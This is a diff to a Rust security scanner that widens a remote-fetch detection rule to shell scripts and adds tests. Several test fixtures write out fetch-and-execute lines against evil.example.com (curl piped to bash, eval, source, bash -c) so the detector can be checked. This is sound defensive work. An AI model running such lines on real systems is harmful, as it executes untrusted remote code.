@@ -870,10 +870,15 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
             // C25: the fetch and decode rules are flow-sensitive, and the
             // assessment must happen per occurrence *before* the best is
             // chosen — gating only the selected match let a harmless first
-            // fetch hide a later executed one.
+            // fetch hide a later executed one. The shell fetch rule
+            // (VAR=$(curl …)) is assessed the same way: a response only
+            // parsed (grep/cut/sed/awk/jq, python json.load) or printed is
+            // not "for execution"; any executed or unknown flow fails closed.
             let flow_sensitive = matches!(
                 pat.rule_id,
-                RULE_PYTHON_REMOTE_FETCH | RULE_PYTHON_BASE64_DECODE_VARIABLE
+                RULE_PYTHON_REMOTE_FETCH
+                    | RULE_PYTHON_BASE64_DECODE_VARIABLE
+                    | RULE_REMOTE_FETCH_TO_VARIABLE
             );
 
             for (i_line, line) in lines.iter().enumerate() {
@@ -894,7 +899,8 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
                                 .as_deref()
                                 .is_some_and(|v| reaches_harmless_consumer(content, v));
                         match pat.rule_id {
-                            RULE_PYTHON_REMOTE_FETCH if harmless => {}
+                            RULE_PYTHON_REMOTE_FETCH | RULE_REMOTE_FETCH_TO_VARIABLE
+                                if harmless => {}
                             RULE_PYTHON_BASE64_DECODE_VARIABLE => {
                                 let occ = if harmless {
                                     Severity::Low
@@ -982,28 +988,34 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
 }
 
 /// True when `var`'s value can reach a code-execution sink anywhere in
-/// `content`: eval/exec on it, a subprocess or os.system call carrying it, or
-/// an import of it. Line-level approximation: a same-file flow check, not a
-/// taint analysis — an unknown flow never suppresses a finding, it only
-/// fails to raise one beyond its base severity.
+/// `content`: eval/exec on it, a subprocess or os.system call carrying it, an
+/// import of it, a shell `eval`/`source` of it, an interpreter `-c` carrying
+/// it, or a pipe of it into a shell interpreter. Line-level approximation: a
+/// same-file flow check, not a taint analysis — an unknown flow never
+/// suppresses a finding, it only fails to raise one beyond its base severity.
 fn reaches_sink(content: &str, var: &str) -> bool {
     // Per-variable pattern: a OnceLock would pin the first variable seen.
     let re = Regex::new(&format!(
-        r#"(?i)(?:eval|exec)\s*\([^)]*\b{var}\b|__import__\s*\(\s*{var}\b|import\s+{var}\b|importlib\.import_module\s*\(\s*{var}\b|subprocess\.\w+\s*\([^)]*\b{var}\b|os\.(?:system|popen)\s*\([^)]*\b{var}\b"#
+        r#"(?i)(?:eval|exec)\s*\([^)]*\b{var}\b|__import__\s*\(\s*{var}\b|import\s+{var}\b|importlib\.import_module\s*\(\s*{var}\b|subprocess\.\w+\s*\([^)]*\b{var}\b|os\.(?:system|popen)\s*\([^)]*\b{var}\b|\beval\s+[^|;&\n]*\b{var}\b|\b(?:bash|zsh|dash|ksh|sh)\s+-c\s+[^|;&\n]*\b{var}\b|\b{var}\b[^|;&\n]*(?:\|[^|;&\n]*)*\|\s*(?:sudo\s+)?(?:bash|zsh|dash|ksh|sh)\b|\bsource\s+[^|;&\n]*\b{var}\b"#
     ))
     .expect("bad sink re");
     re.is_match(content)
 }
 
 /// True when `var`'s value reaches a positively recognized harmless consumer:
-/// JSON/YAML parsing, CSV reading, printing, or a plain string decode. This
-/// is the only recognized proof that a fetched or decoded value is not
-/// executed — absence of a sink is NOT proof, so unknown flows keep the
-/// finding at full severity (aliases, helper calls and cross-file flows are
-/// unknown by construction of this same-file check).
+/// JSON/YAML parsing, CSV reading, printing, or a plain string decode (Python
+/// forms), or — in shell — the variable echoed/printf'd into a pure text
+/// processor (grep/cut/sed/awk/tr/jq/head/tail), piped into `python -c` code
+/// that parses stdin as JSON, or echoed with no pipe, separator or redirect
+/// on the line (a bare print; a redirect could write it to a file a later
+/// line executes, so it fails closed). This is the only recognized proof that
+/// a fetched or decoded value is not executed — absence of a sink is NOT
+/// proof, so unknown flows keep the finding at full severity (aliases, helper
+/// calls and cross-file flows are unknown by construction of this same-file
+/// check).
 fn reaches_harmless_consumer(content: &str, var: &str) -> bool {
     let re = Regex::new(&format!(
-        r#"(?i)(?:json\.loads|yaml\.safe_load|csv\.reader|csv\.dictreader|print)\s*\([^)]*\b{var}\b|\b{var}\s*\.\s*(?:decode|json)\s*\("#
+        r#"(?im)(?:json\.loads|yaml\.safe_load|csv\.reader|csv\.dictreader|print)\s*\([^)]*\b{var}\b|\b{var}\s*\.\s*(?:decode|json)\s*\(|(?:echo|printf)\s+[^|;&>\n]*\b{var}\b[^|;&>\n]*\|\s*(?:grep|cut|sed|awk|tr|jq|head|tail)\b|(?:echo|printf)\s+[^|;&>\n]*\b{var}\b[^|;&>\n]*\|\s*python3?\s+[^|;&>\n]*-c\b\s*(?:"[^"]*|'[^']*)json\.loads?\s*\(\s*sys\.stdin|\b(?:echo|printf)\s+[^|;&>\n]*\b{var}\b[^|;&>\n]*$"#
     ))
     .expect("bad harmless re");
     re.is_match(content)
@@ -1637,5 +1649,167 @@ mod tests {
         let scan = scan_sensitive_patterns(&tf);
         let hit = rule_severity(&scan.findings, "VTD-0025").expect("decode still fires");
         assert!(matches!(hit.1, Severity::High | Severity::Critical));
+    }
+
+    // ── Labelled false-positive shapes: remote fetch parsed, not executed ────
+    //
+    // Every wrong shape from the labelling run must stop firing, and every
+    // canonical fetch-then-execute shape must keep firing — the harmless
+    // proof is an allowlist (parse or print), never a mere absence of a sink.
+
+    // Labelled shapes: the response is captured and only piped into text
+    // processors, parsed by `python -c` as JSON from stdin, or printed.
+    #[test]
+    fn remote_fetch_parsed_by_text_processors_stops_firing() {
+        let content = r#"resp=$(curl -s "https://oapi.dingtalk.com/gettoken?appkey=${app_key}")
+token=$(echo "$resp" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
+expires_in=$(echo "$resp" | grep -o '"expires_in":[0-9]*' | cut -d: -f2)
+field=$(echo "$resp" | jq -r .url)
+o=$(curl -skI --max-time 6 -w 'HTTPCODE=%{http_code}' "https://$h/" 2>/dev/null)
+c=$(printf '%s' "$o"|sed -n 's/.*HTTPCODE=//p'|tail -1)
+s=$(printf '%s' "$o"|awk -F': ' 'tolower($1)=="server"{print $2}'|tr -d '\r'|head -1)
+RESPONSE=$(curl -s -X POST "$DEPLOY_ENDPOINT" -F "file=@$TARBALL")
+if echo "$RESPONSE" | grep -q '"error"'; then
+  ERROR_MSG=$(echo "$RESPONSE" | grep -o '"error":"[^"]*"' | cut -d'"' -f4)
+fi
+echo "$RESPONSE"
+"#;
+        let tf = files(&[("scripts/dt.sh", content)]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_none(),
+            "grep/cut/sed/awk/jq parsing and printing must not be 'for execution': {:?}",
+            scan.findings
+        );
+    }
+
+    #[test]
+    fn remote_fetch_json_loaded_by_python_stops_firing() {
+        // Single-line -c payload…
+        let content = r#"response=$(curl "${CURL_OPTS[@]}" "$url") || { echo "ERROR"; exit 1; }
+total=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin).get('total',0))")
+"#;
+        let tf = files(&[("scripts/iconify.sh", content)]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_none(),
+            "python json.load(sys.stdin) parsing must not be 'for execution': {:?}",
+            scan.findings
+        );
+        // …and a multi-line quoted -c payload, same parse-only shape.
+        let content = "resp=$(curl \"${API_BASE}/collections\")\n\
+                       echo \"$resp\" | python3 -c \"\n\
+                       import sys, json\n\
+                       data = json.load(sys.stdin)\n\
+                       print(data['total'])\n\
+                       \"\n";
+        let tf = files(&[("scripts/iconify.sh", content)]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_none(),
+            "a multi-line python json.load(sys.stdin) payload must not fire: {:?}",
+            scan.findings
+        );
+    }
+
+    // Keep-firing shapes: a positively recognized execution path — or an
+    // unknown flow — keeps the finding at full severity.
+    #[test]
+    fn fetched_variable_piped_to_shell_still_fires() {
+        let content = "x=$(curl -s http://evil.example.com/f.sh)\necho \"$x\" | bash\n";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_some(),
+            "a fetched variable piped into bash must keep firing"
+        );
+    }
+
+    #[test]
+    fn fetched_variable_through_processor_into_shell_still_fires() {
+        // The pipe-chain sink must span intermediate processors: `grep` does
+        // not launder content that then reaches an interpreter.
+        let content =
+            "x=$(curl -s http://evil.example.com/f.sh)\necho \"$x\" | grep '^#!' | bash\n";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_some(),
+            "a fetched variable piped through grep into bash must keep firing"
+        );
+    }
+
+    #[test]
+    fn fetched_variable_eval_or_source_still_fires() {
+        let content = "x=$(curl -s http://evil.example.com/f.sh)\neval \"$x\"\n";
+        let tf = files(&[("scripts/a.sh", content)]);
+        let content2 = "y=$(curl -s http://evil.example.com/f.sh)\nsource <(echo \"$y\")\n";
+        let tf2 = files(&[("scripts/b.sh", content2)]);
+        let scan = scan_sensitive_patterns(&tf);
+        let scan2 = scan_sensitive_patterns(&tf2);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_some(),
+            "an eval'd fetch must keep firing"
+        );
+        assert!(
+            rule_severity(&scan2.findings, "VTD-0022").is_some(),
+            "a sourced fetch must keep firing"
+        );
+    }
+
+    #[test]
+    fn fetched_variable_redirected_to_file_still_fires() {
+        // A redirect can park fetched bytes in a file a later line executes;
+        // it is not a recognized print, so it fails closed.
+        let content = "x=$(curl -s http://evil.example.com/f.sh)\necho \"$x\" > /tmp/x.sh\n";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_some(),
+            "a fetched variable written to a file must keep firing"
+        );
+    }
+
+    #[test]
+    fn parsed_and_executed_fetch_coexisting_still_fires() {
+        // The same variable is parsed in one place and executed in another:
+        // the sink must dominate the harmless consumer.
+        let content = "resp=$(curl -s http://evil.example.com/api)\n\
+                       token=$(echo \"$resp\" | grep -o '\"token\":\"[^\"]*\"')\n\
+                       bash -c \"$resp\"\n";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0022").is_some(),
+            "a sink anywhere in the file must beat a harmless consumer elsewhere"
+        );
+    }
+
+    // The direct fetch-execute forms other rules own, pinned so loosening the
+    // fetch rule can never be used to argue the class is covered elsewhere.
+    #[test]
+    fn curl_piped_to_shell_still_fires() {
+        let tf = files(&[(
+            "scripts/x.sh",
+            "curl -fsSL http://evil.example.com/i.sh | bash\n",
+        )]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0020").is_some(),
+            "curl | bash must keep firing"
+        );
+    }
+
+    #[test]
+    fn bash_dash_c_command_substitution_curl_still_fires() {
+        let tf = files(&[(
+            "scripts/x.sh",
+            "bash -c \"$(curl -s http://evil.example.com/x)\"\n",
+        )]);
+        let scan = scan_sensitive_patterns(&tf);
+        assert!(
+            rule_severity(&scan.findings, "VTD-0021").is_some(),
+            "bash -c \"$(curl …)\" must keep firing"
+        );
     }
 }
